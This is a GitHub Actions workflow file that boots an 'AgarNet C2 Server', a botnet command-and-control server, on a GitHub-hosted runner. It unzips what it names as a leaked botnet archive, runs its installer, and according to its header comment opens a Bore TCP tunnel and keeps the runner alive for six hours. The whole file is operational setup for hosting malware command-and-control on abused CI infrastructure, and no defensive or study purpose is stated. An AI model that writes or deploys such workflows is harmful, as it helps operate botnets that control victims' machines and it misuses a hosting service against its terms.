# language: YAML, file: .github/workflows/c2.yml, target: GitHub Actions (Ubuntu Runner)
# *Automates checkout, dependency setup, C2 boot, Bore TCP tunnel, and keeps runner alive for 6 hours*
name: AgarNet C2 Server

on:
  workflow_dispatch:

jobs:
  run-c2:
    runs-on: ubuntu-latest
    timeout-minutes: 360 # 6 saat kesintisiz çalışma süresi
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Run C2 Installer & Start Tunnel
        run: |
          chmod +x install.sh
          unzip ./agarnetshitleakbyVessy1337.zip
          ./install.sh --keepalive
